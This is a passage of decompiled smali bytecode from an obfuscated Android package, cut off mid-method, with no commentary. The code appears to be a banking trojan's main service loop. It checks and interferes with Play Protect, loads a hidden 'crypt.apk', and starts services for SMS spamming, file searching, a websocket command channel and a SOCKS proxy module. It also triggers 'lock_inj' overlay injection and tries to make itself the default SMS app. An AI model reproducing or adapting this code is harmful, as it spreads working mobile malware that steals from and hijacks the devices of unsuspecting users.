    iget-boolean v4, v4, Lwocwvy/czyxoxmbauu/slsa/c;->q:Z

    if-eqz v4, :cond_12

    const/16 v4, 0xb

    if-eq v6, v4, :cond_11

    if-ne v6, v7, :cond_12

    :cond_11
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "play_protect"

    invoke-virtual {v4, v1, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "error"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_12

    new-instance v4, Ljava/io/File;

    const-string v5, "apk"

    const/4 v13, 0x0

    invoke-virtual {v1, v5, v13}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v5

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {v14}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v14, "crypt"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, ".apk"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v4, v5, v13}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_12

    :try_start_c
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-static/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_b

    :catch_b
    :cond_12
    if-nez v2, :cond_16

    const/16 v2, 0xf

    if-eq v6, v2, :cond_13

    const/16 v4, 0x10

    if-ne v6, v4, :cond_17

    :cond_13
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v4, v4, Lwocwvy/czyxoxmbauu/slsa/c;->r:I

    if-lt v8, v4, :cond_17

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget-boolean v4, v4, Lwocwvy/czyxoxmbauu/slsa/c;->q:Z

    if-eqz v4, :cond_17

    new-instance v4, Ljava/io/File;

    const-string v5, "apk"

    const/4 v13, 0x0

    invoke-virtual {v1, v5, v13}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v5

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {v14}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v14, "crypt"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, ".apk"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v4, v5, v13}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_15

    :try_start_d
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "play_protect"

    invoke-virtual {v4, v1, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "true"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_14

    new-instance v4, Landroid/content/Intent;

    const-class v5, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;

    invoke-direct {v4, v1, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v5, 0x10000000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x40000000    # 2.0f

    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v4}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startActivity(Landroid/content/Intent;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_c

    goto :goto_b

    :catch_c
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "jtfxlnc"

    const-string v13, "ERROR getProtect"

    invoke-virtual {v4, v5, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_14
    :goto_b
    :try_start_e
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "play_protect"

    invoke-virtual {v4, v1, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "error"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_15

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-static/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_d

    :catch_d
    :cond_15
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "DexSocksMolude"

    const-string v13, "yes"

    invoke-virtual {v4, v1, v5, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_c

    :cond_16
    const/16 v2, 0xf

    :cond_17
    :goto_c
    const/16 v4, 0x19

    const/4 v5, 0x2

    if-lt v6, v4, :cond_21

    add-int/lit8 v8, v8, 0x19

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "time_work"

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v1, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "TIME"

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b()V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/xelytgswelv;

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_18

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v13, "websocket"

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v6, ""

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_18

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v14, Lwocwvy/czyxoxmbauu/slsa/xelytgswelv;

    invoke-direct {v6, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v4, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_18
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_19

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object v6, v6, Lwocwvy/czyxoxmbauu/slsa/a;->b:[Ljava/lang/String;

    const/4 v13, 0x0

    aget-object v6, v6, v13

    invoke-virtual {v4, v1, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_19

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v13, "spamSMS"

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v6, "start"

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_19

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v14, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;

    invoke-direct {v6, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v4, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_19
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object v6, v6, Lwocwvy/czyxoxmbauu/slsa/a;->c:[Ljava/lang/String;

    const/4 v13, 0x0

    aget-object v6, v6, v13

    invoke-virtual {v4, v1, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_1a

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "startFind"

    const-string v13, "1"

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_1a

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v13, "findfiles"

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v13, "startFind"

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "2"

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v6, v13, v14}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v6

    const/4 v13, 0x1

    if-le v6, v13, :cond_1a

    const-string v6, "**false**"

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1a

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "jtfxlnc"

    const-string v13, "Find Start 3"

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v14, Lwocwvy/czyxoxmbauu/slsa/mvqkjokaxfrpf;

    invoke-direct {v6, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v4, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_1a
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_1b

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object v13, v13, Lwocwvy/czyxoxmbauu/slsa/a;->c:[Ljava/lang/String;

    const/4 v14, 0x0

    aget-object v13, v13, v14

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_1c

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v13, "status"

    invoke-virtual {v4, v6, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    if-le v4, v5, :cond_1c

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v15, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;

    invoke-direct {v6, v13, v15}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v4, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_d

    :cond_1b
    const/4 v14, 0x0

    :cond_1c
    :goto_d
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v4, v4, Lwocwvy/czyxoxmbauu/slsa/c;->t:I

    const/4 v6, 0x3

    if-eq v4, v6, :cond_1e

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v4, v4, Lwocwvy/czyxoxmbauu/slsa/c;->t:I

    const/4 v6, 0x6

    if-ne v4, v6, :cond_1d

    goto :goto_e

    :catch_e
    :cond_1d
    const/16 v4, 0x3e8

    goto :goto_f

    :cond_1e
    :goto_e
    :try_start_f
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "startRequest"

    invoke-virtual {v4, v1, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v6, "Access=0"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_1f

    const-string v6, "Perm=0"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_e

    if-eqz v4, :cond_1d

    :cond_1f
    const/16 v4, 0x3e8

    if-lt v8, v4, :cond_20

    :try_start_10
    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v13, "startRequest"

    const-string v15, "Access=1Perm=1"

    invoke-virtual {v6, v1, v13, v15}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_f

    :catch_f
    :cond_20
    :goto_f
    const/4 v6, 0x0

    goto :goto_10

    :cond_21
    const/16 v4, 0x3e8

    const/4 v14, 0x0

    :goto_10
    add-int/lit8 v10, v10, 0x1

    add-int/lit8 v11, v11, 0x1

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v15, "Time Requst HTTP"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    div-int/lit16 v4, v12, 0x3e8

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v14, " = "

    invoke-virtual {v2, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v13, v15, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    add-int/2addr v4, v5

    if-lt v10, v4, :cond_22

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v10, "interval"

    invoke-virtual {v2, v4, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v10, Landroid/content/Intent;

    iget-object v12, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;

    invoke-direct {v10, v12, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v4, v10}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move v12, v2

    const/4 v10, 0x0

    :cond_22
    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    if-lt v11, v7, :cond_25

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    invoke-virtual {v2, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->o(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_24

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v7, "lock_inj"

    invoke-virtual {v2, v4, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v9, "del_sws"

    invoke-virtual {v4, v7, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v7, "true"

    invoke-virtual {v4, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    const/4 v4, 0x0

    :try_start_11
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_23

    const-string v4, ""

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_24

    :cond_23
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v4

    if-le v4, v5, :cond_24

    new-instance v4, Landroid/content/Intent;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v7, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    invoke-direct {v4, v5, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "str"

    invoke-virtual {v4, v5, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    const/high16 v4, 0x10000000

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x800000

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x40000000    # 2.0f

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startActivity(Landroid/content/Intent;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_10

    :catch_10
    :cond_24
    const/4 v11, 0x0

    :cond_25
    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "jtfxlnc"

    invoke-virtual {v2, v1, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;)V

    const-wide/16 v4, 0x7d0

    const/16 v2, 0x13

    const/4 v7, 0x1

    if-ne v9, v7, :cond_26

    sget v13, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v13, v2, :cond_27

    invoke-static/range {p0 .. p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_27

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v2, "keyguard"

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/KeyguardManager;

    invoke-virtual {v2}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v2

    if-nez v2, :cond_27

    :try_start_12
    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v2, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_12
    .catch Ljava/lang/InterruptedException; {:try_start_12 .. :try_end_12} :catch_11

    goto :goto_11

    :catch_11
    move-exception v0

    move-object v2, v0

    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_11
    new-instance v2, Landroid/content/Intent;

    const-string v4, "android.provider.Telephony.ACTION_CHANGE_DEFAULT"

    invoke-direct {v2, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v4, "package"

    invoke-virtual/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v4, 0x10000000

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startActivity(Landroid/content/Intent;)V

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "4"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "p="

    invoke-virtual {v5, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v15, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

